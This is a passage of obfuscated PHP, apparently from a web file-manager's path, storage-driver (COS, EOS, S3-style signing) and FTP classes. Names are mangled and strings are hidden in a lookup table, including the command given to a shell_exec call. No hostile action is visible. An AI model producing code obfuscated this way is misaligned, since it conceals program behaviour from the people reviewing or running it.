$_SERVER[³½¬ÚË¯]; $üÑÕ¤Ôğ = self::clear($üÑÕ¤Ôğ); $³…º×­µ = array_values(self::typeList()); preg_match($Õ¡ÏÅÌ‘[1310], $üÑÕ¤Ôğ, $™Ä •Ğ°); $ŸõíÃû = array($Õ¡ÏÅÌ‘[464] => !1, $Õ¡ÏÅÌ‘[1311] => !1, $Õ¡ÏÅÌ‘[461] => !1, $Õ¡ÏÅÌ‘[84] => $üÑÕ¤Ôğ, $Õ¡ÏÅÌ‘[1212] => !1, $Õ¡ÏÅÌ‘[1211] => $Õ¡ÏÅÌ‘[12]); if (is_array($™Ä •Ğ°) && count($™Ä •Ğ°) == 5) { $œØ÷Ù“ = $Õ¡ÏÅÌ‘[1312] . $™Ä •Ğ°[2] . $Õ¡ÏÅÌ‘[371]; if (in_array($œØ÷Ù“, $³…º×­µ)) { $ŸõíÃû[$Õ¡ÏÅÌ‘[1212]] = $™Ä •Ğ°[1]; $ŸõíÃû[$Õ¡ÏÅÌ‘[33]] = $œØ÷Ù“; $ŸõíÃû[$Õ¡ÏÅÌ‘[1313]] = substr($œØ÷Ù“, 1, -1); $ŸõíÃû[$Õ¡ÏÅÌ‘[443]] = $™Ä •Ğ°[3]; } $ŸõíÃû[$Õ¡ÏÅÌ‘[1211]] = $™Ä •Ğ°[4]; } $ñô€–æ = array($Õ¡ÏÅÌ‘[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ŸõíÃû[$Õ¡ÏÅÌ‘[1276]] = in_array($ŸõíÃû[$Õ¡ÏÅÌ‘[33]], $ñô€–æ); return $ŸõíÃû; } public static function isTruePath($ÔòØ“ô) { $ŒÓûş•‰ =& $_SERVER[³½¬ÚË¯]; if (substr($ÔòØ“ô, 0, 1) != $ŒÓûş•‰[1312]) { return !0; } if (strpos($ÔòØ“ô, $ŒÓûş•‰[451]) === 0) { return !0; } if (strpos($ÔòØ“ô, $ŒÓûş•‰[1280]) === 0) { return !0; } if (strpos($ÔòØ“ô, $ŒÓûş•‰[1314]) === 0) { return !0; } if (strpos($ÔòØ“ô, $ŒÓûş•‰[1315]) === 0) { return !0; } if (strpos($ÔòØ“ô, $ŒÓûş•‰[1316]) === 0) { return !0; } return !1; } public static function clear($š’Ë…ŞÁ) { $—Ü™ûÃø =& $_SERVER[³½¬ÚË¯]; $š’Ë…ŞÁ = str_replace(array($—Ü™ûÃø[1121], $—Ü™ûÃø[246]), $—Ü™ûÃø[53], $š’Ë…ŞÁ); $š’Ë…ŞÁ = str_replace($—Ü™ûÃø[97], $—Ü™ûÃø[8], $š’Ë…ŞÁ); $¯ê•¬ë = $—Ü™ûÃø[1317]; if (substr($š’Ë…ŞÁ, 0, 3) == $—Ü™ûÃø[1318]) { $š’Ë…ŞÁ = substr($š’Ë…ŞÁ, 3); } while (strstr($š’Ë…ŞÁ, $¯ê•¬ë)) { $š’Ë…ŞÁ = str_replace($¯ê•¬ë, $—Ü™ûÃø[8], $š’Ë…ŞÁ); } $š’Ë…ŞÁ = preg_replace($—Ü™ûÃø[1319], $—Ü™ûÃø[8], $š’Ë…ŞÁ); if ($š’Ë…ŞÁ == $—Ü™ûÃø[8]) { return $—Ü™ûÃø[8]; } $š’Ë…ŞÁ = rtrim($š’Ë…ŞÁ, $—Ü™ûÃø[8]); return $š’Ë…ŞÁ; } public static function pathTrue($ô¨ìÂ¨õ) { $§­éååì =& $_SERVER[³½¬ÚË¯]; if (!$ô¨ìÂ¨õ) { return $§­éååì[12]; } $ô¨ìÂ¨õ = str_replace($§­éååì[562], $§­éååì[8], str_replace($§­éååì[1320], $§­éååì[8], $ô¨ìÂ¨õ)); $ô¨ìÂ¨õ = str_replace($§­éååì[562], $§­éååì[8], str_replace($§­éååì[1320], $§­éååì[8], $ô¨ìÂ¨õ)); if (!strstr($ô¨ìÂ¨õ, $§­éååì[1318])) { return $ô¨ìÂ¨õ; } $óÖìœ¥Å = explode($§­éååì[8], $ô¨ìÂ¨õ); foreach ($óÖìœ¥Å as $£Í–ñ => $˜£ª¿úŸ) { if ($˜£ª¿úŸ !== $§­éååì[1321]) { continue; } for ($öå¶ñŒ = $£Í–ñ; $öå¶ñŒ >= 0; $öå¶ñŒ--) { if ($óÖìœ¥Å[$öå¶ñŒ] === $§­éååì[10] || $óÖìœ¥Å[$öå¶ñŒ] === $§­éååì[1321] || $óÖìœ¥Å[$öå¶ñŒ] === -1) { continue; } if ($óÖìœ¥Å[$öå¶ñŒ] === $§­éååì[12]) { $óÖìœ¥Å[$£Í–ñ] = -1; break; } $óÖìœ¥Å[$£Í–ñ] = -1; $óÖìœ¥Å[$öå¶ñŒ] = -1; break; } } $ã¹£¸€ = array(); foreach ($óÖìœ¥Å as $˜£ª¿úŸ) { if ($˜£ª¿úŸ !== -1) { $ã¹£¸€[] = $˜£ª¿úŸ; } } $£¡òü¾‚ = implode($§­éååì[8], $ã¹£¸€); if (strpos($£¡òü¾‚, $§­éååì[1322]) === 0) { $£¡òü¾‚ = $§­éååì[1318] . substr($£¡òü¾‚, strlen($§­éååì[1322])); } return $£¡òü¾‚; } public static function sourceID($´œÅ°Ï) { $óÑ»¹„è =& $_SERVER[³½¬ÚË¯]; $€¨£—× = self::parse($´œÅ°Ï); if ($€¨£—×[$óÑ»¹„è[33]] !== self::KOD_SOURCE) { show_json(LNG($óÑ»¹„è[1323]), !1); } return $€¨£—×[$óÑ»¹„è[443]]; } public static function make($Âàğğé¤) { if (!$Âàğğé¤) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Âàğğé¤)); } public static function makeShare($Œù£ƒÈ’, $Ø—ß­«») { return self::makePath(self::KOD_SHARE_ITEM, $Œù£ƒÈ’, $Ø—ß­«»); } public static function makeFileTypePath($¯šİßì) { return self::makePath(self::KOD_USER_FILE_TYPE, $¯šİßì); } public static function makeFileTagPath($ƒå‚îÚ) { return self::makePath(self::KOD_USER_FILE_TAG, $ƒå‚îÚ); } public static function makePath($ Å‡Ğ¸, $ÃÔóê¿ = '', $¿ÈËÎè = '') { $Êı†³¼‹ =& $_SERVER[³½¬ÚË¯]; $ÅÊôé²ß = substr($ Å‡Ğ¸, 1, -1); $¬ÏøÕòú = $Êı†³¼‹[1324] . $ÅÊôé²ß . $Êı†³¼‹[1325] . $ÃÔóê¿ . $Êı†³¼‹[1326]; $¬ÏøÕòú = $¿ÈËÎè ? $¬ÏøÕòú . $¿ÈËÎè . $Êı†³¼‹[8] : $¬ÏøÕòú; return $¬ÏøÕòú; } public static function hashPath($ÊÏ‰ªá®, $Ä¸Ôåï‘ = true) { $ğÙ¶ú =& $_SERVER[³½¬ÚË¯]; $ó‹¶Ğ· = is_array($ÊÏ‰ªá®) ? $ÊÏ‰ªá® : IO::info($ÊÏ‰ªá®); $†îŞ ¬¼ = _get($ó‹¶Ğ·, $ğÙ¶ú[1327], $ğÙ¶ú[12]); if (!$†îŞ ¬¼ && isset($ó‹¶Ğ·[$ğÙ¶ú[219]])) { $†îŞ ¬¼ = trim($ó‹¶Ğ·[$ğÙ¶ú[219]], $ğÙ¶ú[118]); } if (!$†îŞ ¬¼ && isset($ó‹¶Ğ·[$ğÙ¶ú[181]]) && $ó‹¶Ğ·[$ğÙ¶ú[181]]) { $ó‹¶Ğ· = IO::info(KodIO::make($ó‹¶Ğ·[$ğÙ¶ú[181]])); $†îŞ ¬¼ = _get($ó‹¶Ğ·, $ğÙ¶ú[1327], $ğÙ¶ú[12]); } $Ú€¾Î’ = md5($ó‹¶Ğ·[$ğÙ¶ú[84]] . $ó‹¶Ğ·[$ğÙ¶ú[76]] . $ó‹¶Ğ·[$ğÙ¶ú[85]]); if (!$†îŞ ¬¼ && file_exists($ó‹¶Ğ·[$ğÙ¶ú[84]])) { $†îŞ ¬¼ = Cache::get($Ú€¾Î’ . $ğÙ¶ú[1328]); $†îŞ ¬¼ = !1; if (!$†îŞ ¬¼) { $†îŞ ¬¼ = IO::hashSimple($ó‹¶Ğ·[$ğÙ¶ú[84]]); Cache::set($Ú€¾Î’ . $ğÙ¶ú[1328], $†îŞ ¬¼, 3600 * 24 * 30); } } if ($Ä¸Ôåï‘ && !$†îŞ ¬¼) { } return $†îŞ ¬¼ ? $†îŞ ¬¼ : $Ú€¾Î’; } public static function hashPathSafe($ûÆöÓÉ€, $³£ ÙÜˆ = true) { $é¼¨Á…¨ =& $_SERVER[³½¬ÚË¯]; $åÌ…° = self::hashPath($ûÆöÓÉ€, $³£ ÙÜˆ); return md5($åÌ…° . $é¼¨Á…¨[1329] . Model($é¼¨Á…¨[806])->get($é¼¨Á…¨[807])); } public static function initSystemPath() { $İ¤€¨ =& $_SERVER[³½¬ÚË¯]; if (defined($İ¤€¨[1330])) { return; } define($İ¤€¨[1330], self::systemPath($İ¤€¨[179])); define($İ¤€¨[1331], self::systemPath($İ¤€¨[1332])); define($İ¤€¨[1333], self::systemPath($İ¤€¨[1334])); define($İ¤€¨[1335], self::systemPath($İ¤€¨[1336])); IOHistory::bindEvent(); } public static function systemPath($Èş€˜¿‹) { $ë”’½á” =& $_SERVER[³½¬ÚË¯]; $‚‚óöØº = $ë”’½á”[1337] . ucfirst($Èş€˜¿‹); $•ïşÎ÷Á = Model($ë”’½á”[806])->get($‚‚óöØº); if ($•ïşÎ÷Á) { return $•ïşÎ÷Á; } if ($Èş€˜¿‹ == $ë”’½á”[179]) { $•ïşÎ÷Á = self::make(Model($ë”’½á”[861])->systemRootPathAdd($ë”’½á”[575])); } else { $•ïşÎ÷Á = self::systemPath($ë”’½á”[179]); $”ªÄ˜»¸ = self::sourceID($•ïşÎ÷Á); $•ïşÎ÷Á = self::make(Model($ë”’½á”[861])->mkdir($”ªÄ˜»¸, $Èş€˜¿‹)); } Model($ë”’½á”[806])->set($‚‚óöØº, $•ïşÎ÷Á); return $•ïşÎ÷Á; } public static function systemFolder($şŒÆşşß) { $Îõ—ÍÁ = IO_PATH_SYSTEM_SOURCE . $şŒÆşşß; $¡«»í£ = Cache::get($Îõ—ÍÁ); if (!$¡«»í£) { $¾ÙÕ—Ø¹ = IO::infoFullSimple($Îõ—ÍÁ); if (!$¾ÙÕ—Ø¹) { $¡«»í£ = IO::mkdir($Îõ—ÍÁ, REPEAT_SKIP); } else { $¡«»í£ = $¾ÙÕ—Ø¹[$_SERVER[³½¬ÚË¯][84]]; } Cache::set($Îõ—ÍÁ, $¡«»í£, 3600 * 10); } return $¡«»í£; } public static function defaultDriver() { return Model($_SERVER[³½¬ÚË¯][803])->defaultDriver(); } public static function defaultIO() { $›Î€°Š• =& $_SERVER[³½¬ÚË¯]; $¹çøñˆ = self::defaultDriver(); return $›Î€°Š•[1338] . $¹çøñˆ[$›Î€°Š•[443]] . $›Î€°Š•[1326]; } public static function defaultDriverInit() { static $»°«³‘© = false; if ($»°«³‘©) { return $»°«³‘©; } $»°«³‘© = IO::init(self::defaultIO()); return $»°«³‘©; } public static function fileTypeList() { $úÒ¦şÕã =& $_SERVER[³½¬ÚË¯]; $Ã½©’Í… = $GLOBALS[$úÒ¦şÕã[6]][$úÒ¦şÕã[1339]]; foreach ($Ã½©’Í… as $ì¬àŞÚõ => $†›»µû–) { $ÄÆª¹ıÚ = $úÒ¦şÕã[1340] . $ì¬àŞÚõ; $üÅÚ¥À† = LNG($ÄÆª¹ıÚ); if ($ÄÆª¹ıÚ != $üÅÚ¥À†) { $Ã½©’Í…[$ì¬àŞÚõ][$úÒ¦şÕã[32]] = $üÅÚ¥À†; } } return $Ã½©’Í…; } public static function diskList($¡´ëúŒô = true) { $ó¸è¼Ö = $_SERVER[³½¬ÚË¯][1341]; if ($¡´ëúŒô) { $ÂŒ¡ö¸ = Cache::get($ó¸è¼Ö); if (is_array($ÂŒ¡ö¸)) { return $ÂŒ¡ö¸; } } $ÂŒ¡ö¸ = self::diskListGet(); Cache::set($ó¸è¼Ö, $ÂŒ¡ö¸, 60); return $ÂŒ¡ö¸; } public static function diskListGet() { $›®Ó…Åô =& $_SERVER[³½¬ÚË¯]; $ÖÁûÃ‚Ş = array(); if ($GLOBALS[$›®Ó…Åô[6]][$›®Ó…Åô[1342]] == $›®Ó…Åô[1343]) { $ˆÊªÃ³À = $›®Ó…Åô[1344]; for ($µÅ³¿¨ = 0; $µÅ³¿¨ < strlen($ˆÊªÃ³À); $µÅ³¿¨++) { $ñ·×Ïôø = $ˆÊªÃ³À[$µÅ³¿¨] . $›®Ó…Åô[1345]; if (file_exists($ñ·×Ïôø)) { $ÖÁûÃ‚Ş[] = $ñ·×Ïôø; } } return $ÖÁûÃ‚Ş; } if (!function_exists($›®Ó…Åô[98])) { $ÖÁûÃ‚Ş[] = $›®Ó…Åô[872]; return $ÖÁûÃ‚Ş; } $ûœ´Ç¬“ = explode($›®Ó…Åô[246], shell_exec($›®Ó…Åô[1346])); array_shift($ûœ´Ç¬“); array_pop($ûœ´Ç¬“); $ê…å†ø· = array($›®Ó…Åô[1347], $›®Ó…Åô[1348], $›®Ó…Åô[1349], $›®Ó…Åô[1350], $›®Ó…Åô[1351], $›®Ó…Åô[1352], $›®Ó…Åô[1353], $›®Ó…Åô[1354]); foreach ($ûœ´Ç¬“ as $áğ”ÜÑê) { $í³«êµ° = preg_split($›®Ó…Åô[1355], $áğ”ÜÑê); $ñ·×Ïôø = $í³«êµ°[count($í³«êµ°) - 1]; if (!strstr($í³«êµ°[0], $›®Ó…Åô[1356]) || !$ñ·×Ïôø) { continue; } $Óïò™ôá = rtrim($ñ·×Ïôø, $›®Ó…Åô[8]) . $›®Ó…Åô[8]; if (in_array($Óïò™ôá, $ê…å†ø·)) { continue; } $ÖÁûÃ‚Ş[] = $Óïò™ôá; } return $ÖÁûÃ‚Ş; } public static function isSameDisk($ßí¿£Õ…, $‰°Ğ°ğ÷) { $Ìû˜Ì»ù =& $_SERVER[³½¬ÚË¯]; if ($GLOBALS[$Ìû˜Ì»ù[6]][$Ìû˜Ì»ù[1342]] == $Ìû˜Ì»ù[1343]) { return strtolower(substr($ßí¿£Õ…, 0, 1)) == strtolower(substr($‰°Ğ°ğ÷, 0, 1)); } $ÙÖå®¤ = self::diskList(); $¾òÙ¤ˆø = !1; $ÔöØŸ€ğ = !1; sort($ÙÖå®¤); $ÙÖå®¤ = array_reverse($ÙÖå®¤); $ßí¿£Õ… = rtrim($ßí¿£Õ…, $Ìû˜Ì»ù[8]) . $Ìû˜Ì»ù[8]; $‰°Ğ°ğ÷ = rtrim($‰°Ğ°ğ÷, $Ìû˜Ì»ù[8]) . $Ìû˜Ì»ù[8]; foreach ($ÙÖå®¤ as $Ÿïõ•Äˆ) { $¨¸»öùœ = strlen($Ÿïõ•Äˆ); if (!$¾òÙ¤ˆø && substr($ßí¿£Õ…, 0, $¨¸»öùœ) == $Ÿïõ•Äˆ) { $¾òÙ¤ˆø = $Ÿïõ•Äˆ; } if (!$ÔöØŸ€ğ && substr($‰°Ğ°ğ÷, 0, $¨¸»öùœ) == $Ÿïõ•Äˆ) { $ÔöØŸ€ğ = $Ÿïõ•Äˆ; } if ($¾òÙ¤ˆø && $ÔöØŸ€ğ) { break; } } return $¾òÙ¤ˆø === $ÔöØŸ€ğ; } public static function transferType($¦ÁûÔ”Ô, $€‚íÍÓ¿) { $®ªÚƒ³¢ =& $_SERVER[³½¬ÚË¯]; $ÛÜŸŠ­Š = self::driverType($¦ÁûÔ”Ô); $Ëš€Â™ = self::driverType($€‚íÍÓ¿); if ($ÛÜŸŠ­Š[$®ªÚƒ³¢[33]] == $Ëš€Â™[$®ªÚƒ³¢[33]] && $ÛÜŸŠ­Š[$®ªÚƒ³¢[1357]] == $Ëš€Â™[$®ªÚƒ³¢[1357]]) { return $®ªÚƒ³¢[1358]; } if ($ÛÜŸŠ­Š[$®ªÚƒ³¢[33]] == $®ªÚƒ³¢[913] && $Ëš€Â™[$®ªÚƒ³¢[33]] == $®ªÚƒ³¢[106]) { return $®ªÚƒ³¢[1237]; } if ($ÛÜŸŠ­Š[$®ªÚƒ³¢[33]] == $®ªÚƒ³¢[106] && $Ëš€Â™[$®ªÚƒ³¢[33]] == $®ªÚƒ³¢[913]) { return $®ªÚƒ³¢[107]; } return $®ªÚƒ³¢[1359]; } public static function driverType($¤’¥ÀË) { $ñŠàˆŞö =& $_SERVER[³½¬ÚË¯]; $¾Å¾¨²¢ = str_replace($ñŠàˆŞö[1360], $ñŠàˆŞö[12], strtolower($¤’¥ÀË->getType())); if ($¾Å¾¨²¢ == $ñŠàˆŞö[793] || $¾Å¾¨²¢ == $ñŠàˆŞö[1361] || $¾Å¾¨²¢ == $ñŠàˆŞö[1362]) { $¤’¥ÀË = self::defaultDriverInit(); } else { if ($¾Å¾¨²¢ == $ñŠàˆŞö[1247] || $¾Å¾¨²¢ == $ñŠàˆŞö[1363]) { $¤’¥ÀË = IO::init($¤’¥ÀË->pathParse[$ñŠàˆŞö[1194]]); } } $§¨æ¤» = $¤’¥ÀË->path; $¾Å¾¨²¢ = str_replace($ñŠàˆŞö[1360], $ñŠàˆŞö[12], strtolower($¤’¥ÀË->getType())); if ($¾Å¾¨²¢ == $ñŠàˆŞö[106]) { return array($ñŠàˆŞö[33] => $ñŠàˆŞö[106], $ñŠàˆŞö[1357] => $ñŠàˆŞö[12], $ñŠàˆŞö[84] => $§¨æ¤», $ñŠàˆŞö[95] => $¤’¥ÀË); } return array($ñŠàˆŞö[33] => $ñŠàˆŞö[913], $ñŠàˆŞö[1357] => $¤’¥ÀË->pathDriver, $ñŠàˆŞö[84] => $§¨æ¤», $ñŠàˆŞö[95] => $¤’¥ÀË); } public static function pathDriverType($ªÛîÙ) { return $ªÛîÙ ? self::driverType(IO::init($ªÛîÙ)) : !1; } public static function pathDriverLocal($Á³¯‘¶®) { $İû‹¸Îƒ =& $_SERVER[³½¬ÚË¯]; $ÂÌöÀê = $Á³¯‘¶® ? self::driverType(IO::init($Á³¯‘¶®)) : !1; return $ÂÌöÀê[$İû‹¸Îƒ[33]] == $İû‹¸Îƒ[106] ? !0 : !1; } public static function allowCover($ëÊë‰¸ù, $æÆğë¤à = true) { $“ÀÜ¤õ§ =& $_SERVER[³½¬ÚË¯]; if (is_string($ëÊë‰¸ù)) { $ëÊë‰¸ù = IO::info($ëÊë‰¸ù); } if (!$ëÊë‰¸ù || $ëÊë‰¸ù[$“ÀÜ¤õ§[33]] == $“ÀÜ¤õ§[75] || $ëÊë‰¸ù[$“ÀÜ¤õ§[76]] <= 100) { return !1; } if (isset($ëÊë‰¸ù[$“ÀÜ¤õ§[1364]]) || !$ëÊë‰¸ù[$“ÀÜ¤õ§[84]]) { return !1; } if (isset($ëÊë‰¸ù[$“ÀÜ¤õ§[216]]) && !$ëÊë‰¸ù[$“ÀÜ¤õ§[216]]) { return !1; } static $Ùùğ‹ñ‰ = false; if (!$Ùùğ‹ñ‰ || !$æÆğë¤à) { $â™Ò­ô— = self::driverType(IO::init($ëÊë‰¸ù[$“ÀÜ¤õ§[84]])); $§ï€÷Ñ† = $â™Ò­ô—[$“ÀÜ¤õ§[95]]; $Ùùğ‹ñ‰ = $“ÀÜ¤õ§[184]; if ($â™Ò­ô—[$“ÀÜ¤õ§[33]] == $“ÀÜ¤õ§[106]) { $Ùùğ‹ñ‰ = $“ÀÜ¤õ§[1365]; } if ($â™Ò­ô—[$“ÀÜ¤õ§[95]] && is_array($â™Ò­ô—[$“ÀÜ¤õ§[95]]->config)) { $×üóüĞ = $â™Ò­ô—[$“ÀÜ¤õ§[95]]->config; if (isset($×üóüĞ[$“ÀÜ¤õ§[1366]]) && $×üóüĞ[$“ÀÜ¤õ§[1366]]) { $Ùùğ‹ñ‰ = $“ÀÜ¤õ§[1365]; } } } return $Ùùğ‹ñ‰ == $“ÀÜ¤õ§[1365] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($º«åùâ) { parent::__construct($º«åùâ); $this->signatureVersion($_SERVER[³½¬ÚË¯][231]); } public function uploadFormData($ìíÏŸ˜Ğ, $«ÈªØ¯ = 3600) { $ÆÄ¦‡û© =& $_SERVER[³½¬ÚË¯]; $·Ùˆı÷ = $ÆÄ¦‡û©[213]; $ñÙŒ£ƒ² = $ÆÄ¦‡û©[247]; $óâã­À = $ÆÄ¦‡û©[257]; $¹ŒØş«Œ = gmdate($ÆÄ¦‡û©[1367], time() + $«ÈªØ¯); $’Ù¢Ê¨ = (string) time() . $ÆÄ¦‡û©[71] . (string) (time() + $«ÈªØ¯); $îƒé…‡“ = array($ÆÄ¦‡û©[258] => $¹ŒØş«Œ, $ÆÄ¦‡û©[261] => array(array($ÆÄ¦‡û©[263] => $·Ùˆı÷), array($ÆÄ¦‡û©[262] => $this->bucket), array($ÆÄ¦‡û©[264], $ÆÄ¦‡û©[265], $ÆÄ¦‡û©[12]), array($ÆÄ¦‡û©[268] => $óâã­À), array($ÆÄ¦‡û©[1368] => $ñÙŒ£ƒ²), array($ÆÄ¦‡û©[1369] => $this->accessKey), array($ÆÄ¦‡û©[1370] => $’Ù¢Ê¨))); $îƒé…‡“ = json_encode($îƒé…‡“); $–±—¶Î¸ = hash_hmac($ÆÄ¦‡û©[247], $’Ù¢Ê¨, $this->secret); $Õ÷ùì– = sha1($îƒé…‡“); $¹ ïØå™ = hash_hmac($ÆÄ¦‡û©[247], $Õ÷ùì–, $–±—¶Î¸); $øÆêÙËş = array($ÆÄ¦‡û©[263] => $·Ùˆı÷, $ÆÄ¦‡û©[268] => $óâã­À, $ÆÄ¦‡û©[276] => base64_encode($îƒé…‡“), $ÆÄ¦‡û©[1368] => $ñÙŒ£ƒ², $ÆÄ¦‡û©[1369] => $this->accessKey, $ÆÄ¦‡û©[1371] => $’Ù¢Ê¨, $ÆÄ¦‡û©[1372] => $¹ ïØå™, $ÆÄ¦‡û©[196] => $this->getHost()); return $øÆêÙËş; } public function fileOutLink($¡¦ûÀ×„) { $ôÉ“‚ı¥ =& $_SERVER[³½¬ÚË¯]; if (substr($¡¦ûÀ×„, 0, 7) == $ôÉ“‚ı¥[1373]) { $¡¦ûÀ×„ = $ôÉ“‚ı¥[1374] . substr($¡¦ûÀ×„, 7); } header($ôÉ“‚ı¥[162] . $¡¦ûÀ×„); die; } } goto F®¨ÈÏ´³Ê; F›´Ø¢è: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‡Ï›ÔÍ†) { parent::__construct($‡Ï›ÔÍ†); $this->signatureVersion($_SERVER[³½¬ÚË¯][231]); } public function uploadFormData($èÁ²ÅêÇ, $‹ï£¯¡Ÿ = 3600) { $ğôã„Ë¡ =& $_SERVER[³½¬ÚË¯]; $ÜªÖÄá÷ = $ğôã„Ë¡[213]; $ÃÉ’øÌ½ = $ğôã„Ë¡[253]; $î‘Ó÷÷ = $ğôã„Ë¡[62]; $ÁŞùó•“ = gmdate($ğôã„Ë¡[254]); $Õïõ‡æ˜ = gmdate($ğôã„Ë¡[255]); $šåÕåàæ = $ğôã„Ë¡[256]; $‹Ü§åÈœ = $‹ï£¯¡Ÿ . $ğôã„Ë¡[12]; $õØ¡¾é = $ğôã„Ë¡[257]; $¶°€Úò† = array($this->accessKey, $Õïõ‡æ˜, $this->region, $î‘Ó÷÷, $šåÕåàæ); $ëç¹Û†Ã = implode($ğôã„Ë¡[8], $¶°€Úò†); $´Á£Û¿› = array($ğôã„Ë¡[258] => gmdate($ğôã„Ë¡[1367], strtotime($ğôã„Ë¡[260])), $ğôã„Ë¡[261] => array(array($ğôã„Ë¡[262] => $this->bucket), array($ğôã„Ë¡[263] => $ÜªÖÄá÷), array($ğôã„Ë¡[264], $ğôã„Ë¡[265], $ğôã„Ë¡[12]), array($ğôã„Ë¡[264], $ğôã„Ë¡[266], $ğôã„Ë¡[12]), array($ğôã„Ë¡[264], $ğôã„Ë¡[267], $ğôã„Ë¡[12]), array($ğôã„Ë¡[268] => $õØ¡¾é), array($ğôã„Ë¡[269] => $ëç¹Û†Ã), array($ğôã„Ë¡[270] => $ÃÉ’øÌ½), array($ğôã„Ë¡[271] => $ÁŞùó•“), array($ğôã„Ë¡[272] => $‹Ü§åÈœ))); $»«•ÇÕ— = base64_encode(json_encode($´Á£Û¿›)); $°²¬ÅçÅ = hash_hmac($ğôã„Ë¡[273], $Õïõ‡æ˜, $ğôã„Ë¡[274] . $this->secret, !0); $ÀóÛË±Å = hash_hmac($ğôã„Ë¡[273], $this->region, $°²¬ÅçÅ, !0); $†½ê´œ† = hash_hmac($ğôã„Ë¡[273], $î‘Ó÷÷, $ÀóÛË±Å, !0); $ƒ™è¬É = hash_hmac($ğôã„Ë¡[273], $šåÕåàæ, $†½ê´œ†, !0); $¼ºÊÙÔ„ = hash_hmac($ğôã„Ë¡[273], $»«•ÇÕ—, $ƒ™è¬É); $é¼ Ø = array($ğôã„Ë¡[230] => $ğôã„Ë¡[12], $ğôã„Ë¡[275] => $ğôã„Ë¡[12], $ğôã„Ë¡[263] => $ÜªÖÄá÷, $ğôã„Ë¡[268] => $õØ¡¾é, $ğôã„Ë¡[276] => $»«•ÇÕ—, $ğôã„Ë¡[277] => $ëç¹Û†Ã, $ğôã„Ë¡[278] => $ÃÉ’øÌ½, $ğôã„Ë¡[279] => $ÁŞùó•“, $ğôã„Ë¡[280] => $‹Ü§åÈœ, $ğôã„Ë¡[281] => $¼ºÊÙÔ„, $ğôã„Ë¡[196] => $this->getHost()); return $é¼ Ø; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($µñè‚šğ) { parent::__construct(); if (count($µñè‚šğ) > 0) { $this->_init($µñè‚šğ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($È´›Ùûö) { $şßÃ¤×« =& $_SERVER[³½¬ÚË¯]; global $config; $this->appCharset = $config[$şßÃ¤×«[1393]]; $this->systemCharset = $config[$şßÃ¤×«[1394]]; if (isset($È´›Ùûö[$şßÃ¤×«[1395]]) && $È´›Ùûö[$şßÃ¤×«[1395]]) { $this->systemCharset = $È´›Ùûö[$şßÃ¤×«[1395]]; } } public function iconvApp($¦¢ğ¶´) { return $this->iconvTo($¦¢ğ¶´, $this->systemCharset, $this->appCharset); } public function iconvSystem($¥Ûö°¥ô) { return $this->iconvTo($¥Ûö°¥ô, $this->appCharset, $this->systemCharset); } public function getPathOuter($™„ŞÕ¬„) { $ÚÜÙ»íã =& $_SERVER[³½¬ÚË¯]; $ÅÜ‰‚ğÈ = $this->iconvApp($this->pathBase); $™„ŞÕ¬„ = $this->iconvApp($™„ŞÕ¬„); if (substr($ÅÜ‰‚ğÈ, 0, 2) == $ÚÜÙ»íã[1396]) { $ÅÜ‰‚ğÈ = BASIC_PATH . substr($ÅÜ‰‚ğÈ, 2); } if (substr($™„ŞÕ¬„, 0, 2) == $ÚÜÙ»íã[1396]) { $™„ŞÕ¬„ = BASIC_PATH . substr($™„ŞÕ¬„, 2); } $ÅÜ‰‚ğÈ = KodIO::clear($ÅÜ‰‚ğÈ); $™„ŞÕ¬„ = KodIO::clear($™„ŞÕ¬„); $™„ŞÕ¬„ = substr($™„ŞÕ¬„, strlen($ÅÜ‰‚ğÈ)); if (empty($this->pathDriver)) { return $™„ŞÕ¬„; } return $this->pathDriver . $ÚÜÙ»íã[8] . ltrim($™„ŞÕ¬„, $ÚÜÙ»íã[8]); } private function _init($õÔªòâ˜ = array()) { $…Ö”µî =& $_SERVER[³½¬ÚË¯]; if (!function_exists($…Ö”µî[1397])) { throw new Exception(LNG($…Ö”µî[1398])); } $this->config = $õÔªòâ˜; $this->charsetReset($õÔªòâ˜); foreach ($õÔªòâ˜ as $Æ€ï×ä => $Á¦îÎ¬œ) { if (isset($this->{$Æ€ï×ä})) { $this->{$Æ€ï×ä} = $Á¦îÎ¬œ; } } return $this->_login($õÔªòâ˜); } private function _login($­íªïÌÇ) { $ÌÉæ´Š =& $_SERVER[³½¬ÚË¯]; static $âñóÌ¾ö = array(); $ùÉˆë‘š = md5(json_encode($­íªïÌÇ)); if (isset($âñóÌ¾ö[$ùÉˆë‘š])) { foreach ($âñóÌ¾ö[$ùÉˆë‘š] as $¸İŞ€˜™ => $ÂœØ»®æ) { $this->{$¸İŞ€˜™} = $ÂœØ»®æ; } return !0; } $Æ“£¨ªç = parse_url(trim($this->server, $ÌÉæ´Š[8])); $this->host = $Æ“£¨ªç[$ÌÉæ´Š[196]]; $‚ÜâĞ = isset($Æ“£¨ªç[$ÌÉæ´Š[195]]) && $Æ“£¨ªç[$ÌÉæ´Š[195]] == $ÌÉæ´Š[1399] ? !0 : !1; $this->scheme = $‚ÜâĞ ? $ÌÉæ´Š[1400] : $ÌÉæ´Š[1401]; $this->port = isset($Æ“£¨ªç[$ÌÉæ´Š[197]]) ? $Æ“£¨ªç[$ÌÉæ´Š[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $–¨Ş×‰Ô = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ìƒ“–Ùİ = $this->pasv == $ÌÉæ´Š[88] ? !0 : !1; @ftp_pasv($this->connect, $ìƒ“–Ùİ); $âñóÌ¾ö[$ùÉˆë‘š] = array($ÌÉæ´Š[1402] => $this->connect, $ÌÉæ´Š[196] => $this->host, $ÌÉæ´Š[195] => $this->scheme, $ÌÉæ´Š[197] => $this->port); return $–¨Ş×‰Ô; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ìœƒ¥‡, $İ³µ§× = '', $·óæİÛ = REPEAT_RENAME) { if 